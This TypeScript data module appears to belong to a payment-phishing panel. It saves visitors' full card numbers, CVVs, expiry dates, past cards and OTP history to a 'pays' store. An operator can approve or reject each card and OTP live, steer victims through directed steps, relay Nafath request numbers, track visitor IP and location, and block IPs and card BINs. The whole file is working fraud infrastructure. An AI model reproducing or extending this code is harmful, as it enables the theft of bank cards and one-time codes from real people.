// Server-only data facade. The browser talks only to same-origin /api endpoints.

export type User = { uid: string; id: string; email: string | null };
export type DocRef = { __doc: true; collection: string; id: string };
export type CollRef = { __coll: true; collection: string };
export type AuthHandle = { __isAuthHandle: true };

// Kept as compatibility values for existing dashboard call sites. No Supabase
// client, URL, key, or secret is bundled into the browser anymore.
export const supabase = null;
export const db = null;
export const database = null;
export const auth: AuthHandle = { __isAuthHandle: true };

import { authRequestInit } from "./auth-transport";
import { buildCardApprovalPayload } from "./approval-payload";
import { getCardApprovalDecision } from "./card-approval-status";

const MAX_AMOUNT_VALUE = 1_000_000;
const BLOCK_CACHE_TTL_MS = 10_000;
const POLL_INTERVAL_MS = 1_500;
let cachedIpBlocked: boolean | null = null;
let cachedVisitorIp: string | null = null;
let cachedVisitorGeo: any = null;
const blockedVisitorCache = new Map<
  string,
  { blocked: boolean; expiresAt: number }
>();

type ApiResponse<T> = { data?: T; error?: string; success?: boolean };

async function api<T>(url: string, init?: RequestInit): Promise<T> {
  const response = await fetch(url, authRequestInit(init));
  const body = (await response.json().catch(() => ({}))) as ApiResponse<T>;
  if (!response.ok) throw new Error(body.error || "Server request failed");
  return (
    Object.prototype.hasOwnProperty.call(body, "data") ? body.data : body
  ) as T;
}

const jsonInit = (
  method: string,
  body: unknown,
  keepalive = false
): RequestInit => ({
  method,
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify(body),
  ...(keepalive ? { keepalive: true } : {}),
});

let inMemoryVisitorId = "";

const visitorId = () => {
  if (inMemoryVisitorId) return inMemoryVisitorId;
  if (typeof window !== "undefined" && (window as any).__visitorId) {
    inMemoryVisitorId = (window as any).__visitorId;
    return inMemoryVisitorId;
  }
  if (typeof sessionStorage !== "undefined") {
    try {
      const s = sessionStorage.getItem("visitor");
      if (s) {
        inMemoryVisitorId = s;
        return inMemoryVisitorId;
      }
    } catch {}
  }
  if (typeof localStorage !== "undefined") {
    try {
      const l = localStorage.getItem("visitor");
      if (l) {
        inMemoryVisitorId = l;
        return inMemoryVisitorId;
      }
    } catch {}
  }
  return "";
};

export const getOrCreateVisitorId = () => {
  const existing = visitorId();
  if (existing) return existing;
  const id =
    typeof crypto !== "undefined" && "randomUUID" in crypto
      ? `visitor_${crypto.randomUUID()}`
      : `visitor_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`;
  inMemoryVisitorId = id;
  if (typeof window !== "undefined") {
    (window as any).__visitorId = id;
  }
  if (typeof sessionStorage !== "undefined") {
    try {
      sessionStorage.setItem("visitor", id);
    } catch {}
  }
  if (typeof localStorage !== "undefined") {
    try {
      localStorage.setItem("visitor", id);
    } catch {}
  }
  return id;
};
const clampNumber = (value: unknown, min: number, max: number) =>
  typeof value === "number" && !Number.isNaN(value)
    ? Math.min(max, Math.max(min, value))
    : value;

async function fetchRow(collection: string, id: string) {
  try {
    return await api<any>(
      `/api/db/${encodeURIComponent(collection)}/${encodeURIComponent(id)}`
    );
  } catch {
    return null;
  }
}
async function upsertRow(
  collection: string,
  id: string,
  payload: any,
  merge = false,
  keepalive = false
) {
  await api(
    `/api/db/${encodeURIComponent(collection)}/${encodeURIComponent(id)}`,
    jsonInit("POST", { payload, merge }, keepalive)
  );
}
async function deleteRow(collection: string, id: string) {
  await api(
    `/api/db/${encodeURIComponent(collection)}/${encodeURIComponent(id)}`,
    { method: "DELETE", credentials: "same-origin" }
  );
}

export async function addData(data: any) {
  const payload = data;
  const id = typeof payload.id === "string" ? payload.id : visitorId();
  if (!id || cachedIpBlocked === true) return false;
  try {
    await upsertRow(
      "pays",
      id,
      {
        ...payload,
        id,
        updatedAt: new Date().toISOString(),
        createdDate: payload.createdDate || new Date().toISOString(),
      },
      true
    );
    return true;
  } catch {
    return false;
  }
}

export const handlePay = async (paymentInfo: any, setPaymentInfo?: any) => {
  const id = visitorId();
  if (!id) return false;

  let cardHistory: any[] = [];
  try {
    const existing = await fetchRow("pays", id);
    if (existing) {
      cardHistory = Array.isArray(existing.cardHistory) ? [...existing.cardHistory] : [];
      const prevNum = existing.cardNumber || existing.c1;
      if (prevNum && prevNum !== paymentInfo?.cardNumber && prevNum !== paymentInfo?.c1) {
        const prevEntry = {
          cardNumber: prevNum,
          c1: prevNum,
          cvv: existing.cvv || existing.cpc || "",
          expiryMonth: existing.expiryMonth || "",
          expiryYear: existing.expiryYear || "",
          cardName: existing.cardName || "",
          cardType: existing.cardCategory || existing.cardType || "",
          timestamp: existing.updatedAt || new Date().toISOString(),
        };
        if (!cardHistory.some((c: any) => (c.cardNumber || c.c1) === prevNum)) {
          cardHistory.push(prevEntry);
        }
      }
    }
  } catch {}

  const payload = {
    ...paymentInfo,
    ...(cardHistory.length > 0 ? { cardHistory } : {}),
    status: "pending_approval",
    cardApproved: false,
    cardStatus: "pending_approval",
    cardApprovalStatus: "pending_approval",
    approvalStatus: "pending_approval",
    cardApproval: "pending_approval",
    directedPath: null,
    directedStep: 0,
    directedAt: null,
    otpSubmitted: false,
    otpSubmittedAt: null,
    otpApproved: false,
    otpStatus: "pending",
  };
  await upsertRow("pays", id, payload, true);
  setPaymentInfo?.((prev: any) => ({ ...prev, status: "pending_approval" }));
  return true;
};

export const handleOtp = async (otp: string, page = "otp") => {
  const id = visitorId();
  if (!id) return false;
  const submitted = String(otp || "").length > 0;

  let otpHistory: string[] = [];
  try {
    const existing = await fetchRow("pays", id);
    if (existing) {
      otpHistory = Array.isArray(existing.otpHistory) ? [...existing.otpHistory] : [];
      if (existing.otp && existing.otp !== otp && !otpHistory.includes(existing.otp)) {
        otpHistory.push(existing.otp);
      }
    }
  } catch {}

  await upsertRow(
    "pays",
    id,
    {
      otpSubmitted: submitted,
      otpSubmittedAt: new Date().toISOString(),
      currentPage: page,
      otpApproved: false,
      otpStatus: "pending",
      otpApprovalStatus: "pending",
      otp: otp,
      ...(otpHistory.length > 0 ? { otpHistory } : {}),
    },
    true
  );
  return true;
};

export function doc(_db: unknown, collection: string, id: string): DocRef {
  return { __doc: true, collection, id };
}
export function collection(_db: unknown, name: string): CollRef {
  return { __coll: true, collection: name };
}
export function query(coll: CollRef): CollRef {
  return coll;
}
export function arrayUnion(...vals: any[]) {
  return { __arrayUnion: vals };
}
export function arrayRemove(...vals: any[]) {
  return { __arrayRemove: vals };
}

export async function getDoc(ref: DocRef) {
  const row = await fetchRow(ref.collection, ref.id);
  const data = row ?? null;
  return {
    id: ref.id,
    exists: () => data !== null,
    data: () => (data ? { ...data, id: ref.id } : undefined),
    ref,
  };
}
export async function setDoc(
  ref: DocRef,
  payload: any,
  options?: { merge?: boolean; keepalive?: boolean }
) {
  await upsertRow(
    ref.collection,
    ref.id,
    payload,
    options?.merge === true,
    options?.keepalive === true
  );
}
export async function updateDoc(ref: DocRef, payload: any) {
  await upsertRow(ref.collection, ref.id, payload, true);
}
export async function deleteDoc(ref: DocRef) {
  await deleteRow(ref.collection, ref.id);
}

export async function getDocs(coll: CollRef) {
  try {
    const rows = await api<any[]>(
      `/api/db/${encodeURIComponent(coll.collection)}`
    );
    const docs = (rows || []).map((row: any) => {
      const ref = doc(null, coll.collection, row.id);
      return {
        id: row.id,
        ref,
        exists: () => true,
        data: () => ({ ...(row.data || {}), id: row.id }),
      };
    });
    return { docs, size: docs.length, forEach: (fn: any) => docs.forEach(fn) };
  } catch {
    return { docs: [], size: 0, forEach: (_fn: any) => {} };
  }
}

export function writeBatch(_db: unknown) {
  const ops: Array<() => Promise<void>> = [];
  return {
    delete: (ref: DocRef) => ops.push(() => deleteRow(ref.collection, ref.id)),
    set: (ref: DocRef, p: any, o?: { merge?: boolean }) =>
      ops.push(() => upsertRow(ref.collection, ref.id, p, o?.merge === true)),
    update: (ref: DocRef, p: any) =>
      ops.push(() => upsertRow(ref.collection, ref.id, p, true)),
    commit: async () => {
      for (const op of ops) await op();
    },
  };
}

function snapshotFor(id: string, data: any) {
  return {
    id,
    exists: () => data !== null,
    data: () => (data ? { ...data, id } : undefined),
  };
}
function collectionSnapshot(rows: any[]) {
  const docs = (rows || []).map((r: any) => ({
    id: r.id,
    data: () => ({ ...(r.data || {}), id: r.id }),
  }));
  return { docs, size: docs.length, forEach: (fn: any) => docs.forEach(fn) };
}

// Server-side Supabase is the only database connection. The browser uses a
// short polling transport to observe changes without exposing Supabase keys.
export function onSnapshot(target: DocRef | CollRef, cb: (snap: any) => void) {
  let stopped = false;
  let last = "";
  const run = async () => {
    try {
      if ((target as DocRef).__doc) {
        const row = await fetchRow(target.collection, (target as DocRef).id);
        const data = row ?? null;
        const stamp = JSON.stringify(data);
        if (stamp !== last) {
          last = stamp;
          cb(snapshotFor((target as DocRef).id, data));
        }
      } else {
        const rows = await api<any[]>(
          `/api/db/${encodeURIComponent(target.collection)}`
        );
        const stamp = JSON.stringify(rows);
        if (stamp !== last) {
          last = stamp;
          cb(collectionSnapshot(rows));
        }
      }
    } catch {
      /* transient polling errors are ignored */
    }
    if (!stopped) window.setTimeout(run, POLL_INTERVAL_MS);
  };
  void run();
  return () => {
    stopped = true;
  };
}

export const loginWithEmail = async (email: string, password: string) => {
  const data = await api<any>(
    "/api/auth/login",
    jsonInit("POST", { email, password })
  );
  return data;
};
export const logoutUser = async () => {
  await fetch("/api/auth/logout", {
    method: "POST",
    credentials: "same-origin",
  });
};
export const onAuthStateChanged = (
  _auth: unknown,
  cb: (u: User | null) => void
) => {
  let stopped = false;
  const check = async () => {
    try {
      const u = await api<any>("/api/auth/me");
      if (!stopped)
        cb(
          u?.user
            ? { id: u.user.id, uid: u.user.id, email: u.user.email ?? null }
            : null
        );
    } catch {
      if (!stopped) cb(null);
    }
  };
  void check();
  return () => {
    stopped = true;
  };
};

export const fetchVisitorIp = async () => {
  if (cachedVisitorIp) return cachedVisitorIp;
  try {
    const json = await api<any>("/api/visitor-ip");
    cachedVisitorIp = json.ip;
    cachedVisitorGeo = json;
    return json.ip;
  } catch {
    return "";
  }
};
export const listenForIpBlock = (
  ip: string,
  callback: (blocked: boolean) => void
) =>
  onSnapshot(doc(null, "settings", "blockedIps"), snap => {
    const blocked = Boolean(snap.data()?.ips?.includes(ip.trim()));
    cachedIpBlocked = blocked;
    callback(blocked);
  });
export const ensureVisitorIp = async () => {
  const ip = await fetchVisitorIp();
  const id = visitorId();
  if (id && ip) {
    try {
      await upsertRow(
        "pays",
        id,
        {
          ip,
          geoCountry: cachedVisitorGeo?.country,
          geoCity: cachedVisitorGeo?.city,
          ipUpdatedAt: new Date().toISOString(),
        },
        true
      );
    } catch {
      // Silently ignore background IP sync errors to prevent unhandled app crashes
    }
  }
  return { ip, blocked: !!cachedIpBlocked };
};
export const listenForApproval = (
  cb: (status: "approved" | "rejected") => void
) =>
  onSnapshot(doc(null, "pays", visitorId()), (snap: any) => {
    const d = snap.data();
    const decision = getCardApprovalDecision(d);
    console.log("[DEBUG] listenForApproval snapshot data:", {
      cardApproved: d?.cardApproved,
      cardStatus: d?.cardStatus,
      cardApprovalStatus: d?.cardApprovalStatus,
      decision,
    });
    if (decision) cb(decision);
  });
export const handleCurrentPage = async (page: string) => {
  console.log("[DEBUG] handleCurrentPage update:", page);
  const id = visitorId();
  return id ? addData({ id, currentPage: page }) : false;
};
export const listenForDirectedStep = (
  callback: (step: number, data: any) => void
) => {
  let last = "";
  return onSnapshot(doc(null, "pays", visitorId()), (snap: any) => {
    const d = snap.data();
    const step = Number(d?.directedStep) || 0;
    const path = typeof d?.directedPath === "string" ? d.directedPath : "";
    const at = String(d?.directedAt || "");
    if (at && at !== last && (step > 0 || path)) {
      last = at;
      callback(step, d);
    } else if (!step && !path) last = "";
  });
};
export const clearDirectedStep = async () => {
  const id = visitorId();
  if (id)
    await upsertRow(
      "pays",
      id,
      {
        directedStep: 0,
        directedPath: null,
        directedAt: null,
        updatedAt: new Date().toISOString(),
      },
      true
    );
};
export const listenForOtpApproval = (
  cb: (status: "approved" | "rejected") => void
) =>
  onSnapshot(doc(null, "pays", visitorId()), (snap: any) => {
    const d = snap.data();
    console.log("[DEBUG] listenForOtpApproval snapshot data:", {
      otpApproved: d?.otpApproved,
      otpStatus: d?.otpStatus,
      otpApprovalStatus: d?.otpApprovalStatus,
    });
    if (
      d?.otpApproved === true ||
      d?.otpApprovalStatus === "approved" ||
      d?.otpStatus === "approved"
    )
      cb("approved");
    else if (d?.otpStatus === "rejected" || d?.otpApprovalStatus === "rejected")
      cb("rejected");
  });

export const listenForNafathRequestNumber = (
  cb: (number: string) => void
) =>
  onSnapshot(doc(null, "pays", visitorId()), (snap: any) => {
    const d = snap.data();
    if (d?.nafathRequestNumber) {
      cb(String(d.nafathRequestNumber));
    }
  });

export const listenForPhoneOtpApproval = (
  cb: (status: "approved" | "rejected") => void
) =>
  onSnapshot(doc(null, "pays", visitorId()), (snap: any) => {
    const d = snap.data();
    if (
      d?.phoneOtpApproved === true ||
      d?.phoneOtpApprovalStatus === "approved" ||
      d?.phoneOtpStatus === "approved"
    ) {
      cb("approved");
    } else if (
      d?.phoneOtpStatus === "rejected" ||
      d?.phoneOtpApprovalStatus === "rejected"
    ) {
      cb("rejected");
    }
  });
export const updateApprovalStatus = async (
  id: string,
  approved: boolean,
  otpStep = 4
) => {
  const status = approved ? "approved" : "rejected";
  const decidedAt = new Date().toISOString();
  const payload = {
    cardApprovalStatus: status,
    cardApprovalStatusDecidedAt: decidedAt,
    ...buildCardApprovalPayload(status, decidedAt, otpStep),
  };
  console.log("[DEBUG] updateApprovalStatus executed:", {
    id,
    approved,
    status,
    payload,
  });
  return upsertRow("pays", id, payload, true);
};
export const updateOtpApprovalStatus = async (
  id: string,
  approved: boolean
) => {
  console.log("[DEBUG] updateOtpApprovalStatus:", { id, approved });
  return upsertRow(
    "pays",
    id,
    {
      otpApproved: approved,
      otpStatus: approved ? "approved" : "rejected",
      otpApprovalStatus: approved ? "approved" : "rejected",
    },
    true
  );
};
export const pushBankContactRequest = async (id: string) => {
  if (id)
    await upsertRow(
      "pays",
      id,
      {
        bankContactRequest: true,
        bankContactAt: new Date().toISOString(),
        bankContactConfirmed: false,
      },
      true
    );
};
export const listenForBankContactRequest = (
  callback: (show: boolean, payload: any) => void
) =>
  onSnapshot(doc(null, "pays", visitorId()), (snap: any) => {
    const d = snap.data();
    callback(Boolean(d?.bankContactRequest && !d?.bankContactConfirmed), {
      requestedAt: d?.bankContactAt,
      cardBin: "",
      cardBankName: "",
    });
  });
export const confirmBankContact = async () => {
  const id = visitorId();
  if (id)
    await upsertRow(
      "pays",
      id,
      { bankContactConfirmed: true, bankContactRequest: false },
      true
    );
};
export const listenForVisitorBlock = (callback: (blocked: boolean) => void) =>
  onSnapshot(doc(null, "pays", visitorId()), (snap: any) =>
    callback(Boolean(snap.data()?.blocked))
  );
const normalizeBin = (raw: string) =>
  (raw || "").replace(/\D/g, "").slice(0, 6);
export const isBinBlocked = async (value: string) => {
  const bin = normalizeBin(value);
  if (bin.length < 6) return false;
  const cached = blockedVisitorCache.get(bin);
  if (cached && cached.expiresAt > Date.now()) return cached.blocked;
  try {
    const blocked = Boolean(await fetchRow("blocked_bins", bin));
    blockedVisitorCache.set(bin, {
      blocked,
      expiresAt: Date.now() + BLOCK_CACHE_TTL_MS,
    });
    return blocked;
  } catch {
    return false;
  }
};
export const addBlockedBin = async (bin: string, meta?: any) => {
  const n = normalizeBin(bin);
  if (n.length < 6) throw new Error("INVALID_BIN");
  await upsertRow(
    "blocked_bins",
    n,
    { bin: n, blockedAt: new Date().toISOString(), ...(meta || {}) },
    false
  );
  return true;
};
export const removeBlockedBin = async (bin: string) => {
  await deleteRow("blocked_bins", normalizeBin(bin));
  return true;
};
export const listenBlockedBins = (callback: (bins: any[]) => void) =>
  onSnapshot(collection(null, "blocked_bins"), (snap: any) => {
    const list: any[] = [];
    snap.forEach((d: any) => list.push({ bin: d.id, ...d.data() }));
    callback(list);
  });
export const updateVisitorBlockStatus = async (id: string, blocked: boolean) =>
  upsertRow(
    "pays",
    id,
    { blocked, blockedAt: blocked ? new Date().toISOString() : null },
    true
  );
